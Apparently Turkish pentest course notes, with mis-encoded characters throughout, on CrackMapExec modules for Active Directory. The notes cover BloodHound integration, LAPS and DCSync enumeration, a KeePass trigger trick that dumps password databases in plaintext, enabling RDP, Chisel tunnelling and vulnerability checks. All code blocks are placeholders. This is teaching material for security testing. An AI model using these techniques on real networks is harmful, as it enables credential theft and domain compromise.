Ã–rnek olarak Metasploit'i kullanalÄ±m ve modÃ¼lÃ¼ kullanmak yerine web_delivery payload'unda saÄŸlanan PowerShell script'ini kopyalamayÄ± deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bÃ¶lÃ¼m, CrackMapExec'i C2 Frameworks gibi diÄŸer bilgisayar korsanlÄ±ÄŸÄ± araÃ§larÄ±yla nasÄ±l kullanabileceÄŸimizi araÅŸtÄ±rÄ±yor. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in BloodHound ile nasÄ±l entegre edileceÄŸi incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldÄ±rganlar hem de savunmacÄ±lar tarafÄ±ndan alan gÃ¼venliÄŸini analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir araÃ§tÄ±r. AraÃ§, domain'den toplanan bÃ¼yÃ¼k miktarda veriyi alÄ±r. Ä°liÅŸkiyi gÃ¶rsel olarak temsil etmek ve geleneksel numaralandÄ±rma ile tespit edilmesi zor veya imkansÄ±z olan domain saldÄ±rÄ± yollarÄ±nÄ± belirlemek iÃ§in grafik teorisini kullanÄ±r. Bu bÃ¶lÃ¼mde Bloodhound'a aÅŸina olduÄŸunuzu varsayÄ±yoruz. 


### **BloodHound**'da **Owned** olarak iÅŸaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geÃ§irilmiÅŸ (owned) olarak iÅŸaretleyebiliriz. Bunu yapmak iÃ§in node'a saÄŸ tÄ±klayÄ±p **`Mark X as Owned`** seÃ§eneÄŸine tÄ±klamamÄ±z yeterlidir. Bu, ele geÃ§irdiÄŸimiz kullanÄ±cÄ±larÄ± ve bilgisayarlarÄ± takip etmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r, Ã¶zellikle bÃ¼yÃ¼k bir organizasyonla Ã§alÄ±ÅŸÄ±rken. AyrÄ±ca, **`Shortest Path from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan En KÄ±sa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan Domain Adminlerine En KÄ±sa Yollar) gibi bir BloodHound cypher sorgusu gerÃ§ekleÅŸtirmek istediÄŸimizde de kullanÄ±ÅŸlÄ±dÄ±r.

CrackMapExec'i, ele geÃ§irdiÄŸimiz herhangi bir user veya computer'Ä± BloodHound veritabanÄ±nda `owned` olarak iÅŸaretleyecek ÅŸekilde yapÄ±landÄ±rabiliriz. Bunu yapmak iÃ§in, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± aÅŸaÄŸÄ±daki seÃ§eneklerle deÄŸiÅŸtirmemiz gerekir:

* Bloodhound yapÄ±landÄ±rma seÃ§eneÄŸi `bh_enabled`'Ä± `True` olarak ayarlayÄ±n.
* `bh_uri`'yi Bloodhound veritabanÄ± `IP` adresimize ayarlayÄ±n.
* `bh_port`'u veritabanÄ± `portuna` ayarlayÄ±n
* Kimlik bilgilerini bloodhound veritabanÄ±yla eÅŸleÅŸecek ÅŸekilde ayarlayÄ±n: kullanÄ±cÄ± adÄ± `neo4j` ve ÅŸifre `asdasd123` (VeritabanÄ±nÄ±za karÅŸÄ±lÄ±k geleni kullandÄ±ÄŸÄ±nÄ±zdan emin olun).

YapÄ±landÄ±rma aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: BaÄŸlandÄ±ÄŸÄ±nÄ±z BloodHound veritabanÄ±na karÅŸÄ±lÄ±k gelen kullanÄ±cÄ± adÄ± ve parolayÄ± kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

### Bloodhound Verilerinin ToplanmasÄ±

BloodHound verilerini toplamak iÃ§in CrackMapExec kullanarak SharpHound'u Ã§alÄ±ÅŸtÄ±racak ve ardÄ±ndan dosyayÄ± saldÄ±rÄ± hostumuza aktaracaÄŸÄ±z.

### BloodHound verilerinin toplanmasÄ±

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Åimdi BloodHound'u aÃ§mamÄ±z ve verileri iÃ§e aktarmamÄ±z gerekiyor.


### BloodHound'da KullanÄ±cÄ±larÄ± Owned Olarak Ayarlama

Veriler iÃ§e aktarÄ±ldÄ±ktan sonra, `robert` kullanÄ±cÄ±sÄ± ile baÄŸlanmaya Ã§alÄ±ÅŸÄ±rsak, kullanÄ±cÄ±yÄ± BloodHound veritabanÄ±nda owned olunan olarak ayarlayacaktÄ±r.

### KullanÄ±cÄ± BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanÄ±cÄ±sÄ± olan bir makineyi tehlikeye atarsak da aynÄ± ÅŸey olacaktÄ±r. Bulunan tÃ¼m yeni kullanÄ±cÄ±larÄ± owned olarak ayarlayacaktÄ±r.

### Procdump ModÃ¼lÃ¼ ile KullanÄ±cÄ±larÄ± Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: TÃ¼m CrackMapExec seÃ§enekleri BloodHound veritabanÄ± ile senkronize olmayacaktÄ±r. Ã–rneÄŸin, `--ntds` veya `--lsa` seÃ§eneklerini denersek, kullanÄ±cÄ±larÄ± veritabanÄ±nda sahip olunan olarak iÅŸaretlemez, ancak `procdump` veya `lsassy` gibi modÃ¼ller kullanÄ±cÄ±larÄ± sahip olunan olarak iÅŸaretler.


### BloodHound'da BilgisayarlarÄ± Owned Olarak Ayarlama

YazÄ±m sÄ±rasÄ±nda, BloodHound entegrasyonu yalnÄ±zca user'larÄ± Owned olarak iÅŸaretlemektedir. Bir `computer` owned olarak iÅŸaretlemek istiyorsak, `bh_owned` modÃ¼lÃ¼nÃ¼ ve `neo4j` veritabanÄ±mÄ±zÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifresini kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, diÄŸer varsayÄ±lan deÄŸerler neo4j veritabanÄ±mÄ±zla eÅŸleÅŸtiÄŸi iÃ§in yalnÄ±zca `PASS` seÃ§eneÄŸini ekleyeceÄŸiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, bÃ¼yÃ¼k aÄŸlarla uÄŸraÅŸÄ±rken birÃ§ok seÃ§enek sunar ve mÃ¼ÅŸterilerimizle paylaÅŸmak istememiz durumunda veritabanÄ±nÄ± gÃ¼ncellemenin hÄ±zlÄ± bir yoludur. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec'te mevcut olan bazÄ± popÃ¼ler modÃ¼llerle Ã§alÄ±ÅŸacaÄŸÄ±z.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici ÅŸeylerden biri, modÃ¼ler olmasÄ± ve herkesin modÃ¼ller oluÅŸturmasÄ±na ve bunlarÄ± araca katkÄ±da bulunmasÄ±na izin vermesidir. CrackMapExec, exploit ve exploit sonrasÄ± gÃ¶revleri kolaylaÅŸtÄ±rmak iÃ§in iÅŸlemler gerÃ§ekleÅŸtirmemizi saÄŸlayan 50'den fazla modÃ¼le sahiptir. Bu bÃ¶lÃ¼mde LDAP ve SMB protokolleri iÃ§in bu modÃ¼llerden bazÄ±larÄ± incelenecektir.


### LDAP Protocol Modules

LDAP protokolÃ¼ yaygÄ±n olarak Domain Controller'lar ile etkileÅŸime geÃ§memizi ve onlardan bilgi almamÄ±zÄ± saÄŸlar. Active Directory'den ilginÃ§ bilgiler Ã§Ä±karmamÄ±zÄ± saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.


### **LDAP Module - get-network**

`get-network` modÃ¼lÃ¼ [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'Ä±  temel alÄ±r. VarsayÄ±lan olarak, Active Directory'deki herhangi bir kullanÄ±cÄ±, `zone transferine` benzer ÅŸekilde Domain veya Forest DNS bÃ¶lgelerindeki tÃ¼m DNS kayÄ±tlarÄ±nÄ± numaralandÄ±rabilir. Bu araÃ§, internal aÄŸlarÄ±n yeniden yapÄ±landÄ±rÄ±lmasÄ± amacÄ±yla bÃ¶lgedeki tÃ¼m DNS kayÄ±tlarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± saÄŸlar.

ModÃ¼lÃ¼ kullanmanÄ±n Ã¼Ã§ (3) yolu vardÄ±r:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adlarÄ±).

VarsayÄ±lan olarak, herhangi bir seÃ§enek belirtmezsek, modÃ¼l yalnÄ±zca IP adresini alacaktÄ±r. `ALL=true` seÃ§eneÄŸini seÃ§ersek, hem IP hem de domain adlarÄ±nÄ± alÄ±r ve `ONLY_HOSTS=true` olarak belirtirsek, yalnÄ±zca FQDN'yi alÄ±rÄ±z.


### DNS Sunucusundan (Record) KayÄ±tlarÄ± Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± zamanda, modÃ¼l **`adidnsdump`** aracÄ±yla bazÄ± farklÄ±lÄ±klar gÃ¶stermektedir. SonuÃ§lar, hesaplar arasÄ±nda farklÄ±lÄ±k gÃ¶sterebilir.


### LDAP Module - laps

Bir baÅŸka harika modÃ¼l de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e baÄŸlÄ± bilgisayarlarda local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL'ler tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca belirli kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya `parola sÄ±fÄ±rlama` talebinde bulunabilir. Laps modÃ¼lÃ¼ ile bir hesabÄ±n okuma eriÅŸimine sahip olduÄŸu tÃ¼m bilgisayarlarÄ± alabiliriz. Bir bilgisayarÄ± belirtmek iÃ§in `COMPUTER` seÃ§eneÄŸini de kullanabilir veya benzer ada sahip birkaÃ§ bilgisayarÄ± almak iÃ§in bir wildcard karakterle birlikte kullanabiliriz.


### LAPS ModÃ¼lÃ¼ ParolalarÄ±n AlÄ±nmasÄ±

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: KullanÄ±lan parola bir Ã¶rnektir. Hedef hostta Ã§alÄ±ÅŸmayacaktÄ±r

### LDAP ModÃ¼lÃ¼ - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'Ã¼ ile temsil edilen ve varsayÄ±lan olarak bir **user**'Ä±n bir **domain** iÃ§inde oluÅŸturabileceÄŸi **computer account** sayÄ±sÄ±nÄ± belirten bir **domain level attribute**'tÃ¼r.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazÄ± **attack** senaryolarÄ±nda **domain** iÃ§inde bir **machine** oluÅŸturmak gerekebilir, bu yÃ¼zden **account machine quota attribute**'Ã¼nÃ¼ **enumerate** etmek Ã¶nemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir baÅŸka harika modÃ¼l ise bir veya birden fazla object'in `DACL`'lerini okumamÄ±zÄ± ve dÄ±ÅŸa aktarmamÄ±zÄ± saÄŸlayan `daclread`'dir. Bu modÃ¼l Active Directory eriÅŸimini numaralandÄ±rmamÄ±zÄ± saÄŸlayacaktÄ±r. AÅŸaÄŸÄ±daki seÃ§eneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabÄ±nÄ±n tÃ¼m **ACE**'lerini okumak istiyoruz. Bunun iÃ§in **`TARGET`** seÃ§eneÄŸini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace KullanÄ±cÄ±sÄ±nÄ±n DACL'sini Oku

{{CODE_BLOCK_203}}


AyrÄ±ca belirli haklarÄ± da arayabiliriz, Ã¶rneÄŸin hangi **principal**'larÄ±n **DCSync** haklarÄ±na sahip olduÄŸunu. Bunun iÃ§in **`TARGET_DN`** seÃ§eneÄŸini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seÃ§eneÄŸini seÃ§memiz ve aramak istediÄŸimiz haklarÄ± **`RIGHTS`** seÃ§eneÄŸiyle belirlememiz gerekir.

### DCSync Rights'a Sahip KullanÄ±cÄ±larÄ± Arama

{{CODE_BLOCK_204}}



Ã‡Ä±ktÄ±da gÃ¶sterildiÄŸi gibi, `ACE[4]` `robert` kullanÄ±cÄ±sÄ±nÄ±n hedef domain'de `DCSync` haklarÄ±na sahip olduÄŸunu gÃ¶sterir.

LDAP'ta birkaÃ§ modÃ¼l daha kullanabiliriz. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolÃ¼nde daha fazla modÃ¼l mevcuttur. CrackMapExec modÃ¼lÃ¼nde yaptÄ±ÄŸÄ±mÄ±z ÅŸeylerin Ã§oÄŸu SMB protokolÃ¼nÃ¼ kullanÄ±r. Ä°lginÃ§ bilgiler elde etmemizi saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.

Not: SMB kullanan modÃ¼llerin Ã§oÄŸunun Ã§alÄ±ÅŸmasÄ± iÃ§in admin haklarÄ±na ( `Pwned!` ) ihtiyaÃ§ vardÄ±r.


### SMB ModÃ¼lleri - get_netconnections ve ioxidresolver

Bir aÄŸ pentesti Ã¼zerinde Ã§alÄ±ÅŸÄ±rken, sÃ¼rekli olarak daha fazla kaynaÄŸa veya aÄŸa eriÅŸim elde etmeye Ã§alÄ±ÅŸÄ±rÄ±z. CrackMapExec, daha Ã¶nce tehlikeye attÄ±ÄŸÄ±mÄ±z bir makineyi numaralandÄ±rmamÄ±za ve birden fazla aÄŸ yapÄ±landÄ±rmasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± belirlememize olanak tanÄ±yan bazÄ± modÃ¼llere sahiptir. `get_netconnections` ve `ioxidresolver` modÃ¼llerini kullanalÄ±m ve farklarÄ±nÄ± gÃ¶relim.

`get_netconnections` modÃ¼lÃ¼, aÄŸ baÄŸlantÄ±larÄ±nÄ± sorgulamak iÃ§in `WMI` kullanÄ±r. `IPv6` ve herhangi bir ikincil IP dahil olmak Ã¼zere tÃ¼m IP adreslerinin yanÄ± sÄ±ra domain adÄ±nÄ± da alÄ±r.


### get_netconnections Module

{{CODE_BLOCK_206}}


Ã–te yandan, `ioxidresolver` modÃ¼lÃ¼ IP adreslerini sorgulamak iÃ§in RPC kullanÄ±r. Ancak, bu modÃ¼l `IPv6` adreslerini iÃ§ermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: Ä°htiyaÃ§larÄ±mÄ±za en uygun olanÄ± seÃ§ebilmemiz iÃ§in bir modÃ¼lÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal aÄŸlarda adminler ve kullanÄ±cÄ±lar tarafÄ±ndan parolalarÄ± ve gizli bilgileri tek bir veritabanÄ±nda saklamak iÃ§in yaygÄ±n olarak kullanÄ±lan Ã¼cretsiz, aÃ§Ä±k kaynaklÄ± bir password manager'dÄ±r. Bir master password onu korur. Bir KeePass veritabanÄ± alÄ±rsak, onu aÃ§mak iÃ§in ÅŸifresine ihtiyacÄ±mÄ±z vardÄ±r.

### KeePass'i KeÅŸfetme

{{CODE_BLOCK_208}}

EÄŸer master parolaya sahip deÄŸilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafÄ±ndan geliÅŸtirilen ve veritabanÄ±nÄ± aÃ§Ä±k metin olarak dÄ±ÅŸa aktarmak iÃ§in KeePass'Ä±n triger sistemini kullanan bir teknik kullanmaktÄ±r. KeePass yapÄ±landÄ±rma dosyasÄ±nÄ±, veritabanÄ±nÄ± otomatik olarak aÃ§Ä±k metin olarak dÄ±ÅŸa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) iÃ§erecek ÅŸekilde deÄŸiÅŸtirir.

Bunu kullanmak iÃ§in beÅŸ (5) adÄ±ma ihtiyacÄ±mÄ±z var:

*  KeePass yapÄ±landÄ±rma dosyasÄ±nÄ± bulun. Biz bunu `keepass_discover` modÃ¼lÃ¼ ile yaptÄ±k.
 * `ACTION=ADD` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH` Ã¶ÄŸesini kullanarak trigger'Ä± yapÄ±landÄ±rma dosyasÄ±na ekleyin.

### KeePass YapÄ±landÄ±rma DosyasÄ±na Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapÄ±landÄ±rma yolu iÃ§in ters eÄŸik Ã§izgi (`/`) veya Ã§ift eÄŸik Ã§izgi (`\`) kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

* KullanÄ±cÄ±nÄ±n KeePass'i aÃ§masÄ±nÄ± ve master parolayÄ± girmesini bekleyin. Bu iÅŸlemi zorlamak iÃ§in `ACTION=RESTART` seÃ§eneÄŸini kullanarak KeePass.exe prosesini yeniden baÅŸlatabiliriz. Hedef makinede oturum aÃ§mÄ±ÅŸ Ã§ok sayÄ±da kullanÄ±cÄ± varsa, `USER=julio` gibi kullanÄ±cÄ± adÄ± ile `USER` seÃ§eneÄŸini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seÃ§eneÄŸini kullanarak export edilen veritabanÄ±nÄ± makinemize sorgulayÄ±n. Daha sonra ÅŸifre giriÅŸlerini aramak iÃ§in grep kullanabiliriz.


### Ele GeÃ§irilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapÄ±landÄ±rma dosyasÄ±nÄ± temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modÃ¼lÃ¼n her seÃ§eneÄŸini Ã¶ÄŸrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seÃ§eneÄŸin iyi yanÄ±, **extract_password** yÃ¶ntemini de iÃ§ermesidir; bu yÃ¶ntem **.xml** dosyasÄ±nda herhangi bir parola giriÅŸini arar ve konsola yazdÄ±rÄ±r.


### keeppass_trigger TÃœMÃœNÃœ Tek Komutta Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_214}}

Not: ModÃ¼l ÅŸifreyi yazdÄ±rÄ±rken sorun yaÅŸayabilir. Bir hata alabiliriz, ancak ÅŸifre `/tmp/export.xml` dosyasÄ±nda olacaktÄ±r, bÃ¶ylece manuel olarak alabiliriz.

### RDP'yi EtkinleÅŸtirme veya Devre DÄ±ÅŸÄ± BÄ±rakma

DeÄŸerlendirme yaparken yapmak isteyebileceÄŸimiz yaygÄ±n bir gÃ¶rev, RDP aracÄ±lÄ±ÄŸÄ±yla bir hedef makineye baÄŸlanmaktÄ±r. Bu, baÅŸka tÃ¼rlÃ¼ lateral hareket saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtiremediÄŸimiz veya standart bir protokol kullanarak radarÄ±n altÄ±ndan geÃ§mek istediÄŸimiz bazÄ± senaryolarda yararlÄ± olabilir.

BaÄŸlanmak istediÄŸimiz makinede RDP etkin deÄŸilse, buna izin vermek iÃ§in RDP modÃ¼lÃ¼nÃ¼ kullanabiliriz. `ACTION` seÃ§eneÄŸini ve ardÄ±ndan `enable` veya `disable` seÃ§eneklerini belirtmemiz gerekir.


### RDP'yi EtkinleÅŸtirme

{{CODE_BLOCK_215}}


SMB'de birkaÃ§ modÃ¼l daha vardÄ±r. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bÃ¶lÃ¼mde, ZeroLogon gibi bilinen gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanan diÄŸer SMB modÃ¼llerine bakacaÄŸÄ±z

### Vulnerability Scan Modules

SÄ±zma testi yaparken gerÃ§ekleÅŸtirdiÄŸimiz gÃ¼nlÃ¼k faaliyetlerden biri gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmeye Ã§alÄ±ÅŸmaktÄ±r. EÄŸer herhangi birini bulabilirsek, exploitation iÅŸi basit olabilir.

CrackMapExec, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmemizi saÄŸlayan bazÄ± modÃ¼ller iÃ§erir. Bu oturumda bunlardan bazÄ±larÄ±nÄ± inceleyeceÄŸiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geÃ§irdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki aÄŸ kartÄ± var ve amacÄ±mÄ±z domainin saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek. Domainin IP adresi `172.16.10.3`'tÃ¼r.

Domain'e eriÅŸim saÄŸlamak iÃ§in, CME ile ProxyChain bÃ¶lÃ¼mÃ¼nde Ã¶ÄŸrendiklerimizi kullanacaÄŸÄ±z ve Chisel ile bir baÄŸlantÄ± kuracaÄŸÄ±z


### Chisel'i Hedef Makineye GÃ¶nderme

{{CODE_BLOCK_217}}


### SaldÄ±rÄ± Hostumuzda Chisel'Ä± Sunucu Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_218}}


### Chisel'Ä± Tehlikeye DÃ¼ÅŸmÃ¼ÅŸ Cihazdan SaldÄ±rÄ± Hostumuza BaÄŸlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki gÃ¼venlik aÃ§Ä±ÄŸÄ± modÃ¼llerinin Ã§oÄŸu yalnÄ±zca kontrol edilir ve bu modÃ¼lleri gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanmak iÃ§in kullanamayÄ±z. [ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile baÅŸlayalÄ±m.


### ZeroLogon

KimliÄŸi doÄŸrulanmamÄ±ÅŸ bir saldÄ±rgan, bir domain controller'a aÄŸ eriÅŸimi ile[ ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanmak ve sonunda domain'in controller'Ä± ele geÃ§irmek iÃ§in savunmasÄ±z bir Netlogon session'Ä± baÅŸlatmasÄ± gerekir. Bir Domain Controller'a baÄŸlanmak baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in tek Ã¶n koÅŸul olduÄŸundan, gÃ¼venlik aÃ§Ä±ÄŸÄ± ciddidir.

CrackMapExec, bir Domain Controller'Ä±n ZeroLogon'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan zerologon adlÄ± bir modÃ¼l iÃ§erir.


### ZeroLogon GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_220}}


### PetitPotam

GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± [Gilles Lionel](https://twitter.com/topotam77) kÄ±sa bir sÃ¼re Ã¶nce [PetitPotam](https://github.com/topotam/PetitPotam) adÄ± verilen ve saldÄ±rganlarÄ±n sadece kurumsal aÄŸ altyapÄ±sÄ±na eriÅŸim saÄŸlayarak domain'i tehlikeye atmasÄ±na olanak tanÄ±yan bir saldÄ±rÄ± tekniÄŸini ortaya Ã§Ä±kardÄ±. YÃ¶ntem, sunulan herhangi bir sunucu servisine (Ã¶rneÄŸin bir Domain Controller) yÃ¶nelik klasik bir `NTLM relay` saldÄ±rÄ±sÄ±dÄ±r. Lionel ayrÄ±ca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldÄ±rganlarÄ±n domain'i ele geÃ§irmek iÃ§in bu Ã¶zel saldÄ±rÄ± tekniÄŸini nasÄ±l kullanabileceklerini gÃ¶steren bir proof of  concept kodu da yayÄ±nladÄ±.

CrackMapExec, bir Domain Controller'Ä±n PetitPotam'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan `petitpotam` adlÄ± bir modÃ¼l iÃ§erir.


### Petitpotam GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_221}}


### noPAC

noPAC gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n exploit'i, normal bir domain kullanÄ±cÄ±sÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ±n bir domain admin yÃ¼kseltilmesine izin verdi. Kavram kanÄ±tÄ± (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayÄ±nlandÄ±.

CrackMapExec, bir domain controller'Ä±n noPAC'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan nopac adlÄ± bir modÃ¼l iÃ§erir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlÄ± bir NTLM relay saldÄ±rÄ±sÄ± iÃ§in bir kavram kanÄ±tÄ± ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayÄ±nladÄ±. YÃ¶ntem, bir Windows domain'inin controller'Ä± ele geÃ§irmek iÃ§in Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolÃ¼nÃ¼ ele geÃ§iriyor.

Bu saldÄ±rÄ± bir domain kullanÄ±cÄ±sÄ± gerektirir ve bir DC'nin savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in CrackMapExec modÃ¼lÃ¼ `dfscoerce`'yi kullanabiliriz. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Y3t4n0th3rP4ssw0rd` ÅŸifresiyle `carole.holmes` hesabÄ±nÄ± kullanacaÄŸÄ±z.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Lionel Gilles tarafÄ±ndan 2021'in sonlarÄ±nda PetitPotam saldÄ±rÄ±sÄ±nÄ± sergileyen bir sunumun sonunda keÅŸfedildi ve ilk kez detaylandÄ±rÄ±ldÄ±. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanÄ±tÄ± ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluÅŸturdu.

CrackMapExec modÃ¼lÃ¼ shadowcoerce kullanarak DC'nin bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in carole.holmes hesabÄ±nÄ± kullanalÄ±m.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


GÃ¼venlik aÃ§Ä±ÄŸÄ± tarama modÃ¼llerinin Ã§oÄŸu yazarÄ±, bilgisayarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olup olmadÄ±ÄŸÄ±na dair bir mesaj eklememiÅŸtir, bu nedenle komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra hiÃ§bir ÅŸey gÃ¶rmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modÃ¼lÃ¼nÃ¼n kaynak kodunu kontrol edersek, yazarÄ±n ( `logging.debug` ) ile bazÄ± debug log'larÄ± eklediÄŸini gÃ¶receÄŸiz. CrackMapExec'i hata debug modunda Ã§alÄ±ÅŸtÄ±rÄ±rsak, bu loglarÄ± yazdÄ±racaktÄ±r.

CrackMapExec'i debug modunda Ã§alÄ±ÅŸtÄ±rmak iÃ§in protokolden Ã¶nce `--verbose` seÃ§eneÄŸini kullanabiliriz


### shadowcoerce ModÃ¼lÃ¼nÃ¼ Verbose Enabled ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_225}}


`DEBUG` ile baÅŸlayan satÄ±rlar `logging.debug`'a karÅŸÄ±lÄ±k gelir. Son satÄ±rlarda hedefin savunmasÄ±z olmadÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini gÃ¶rebiliriz.


### MS17-010 (EternalBlue)

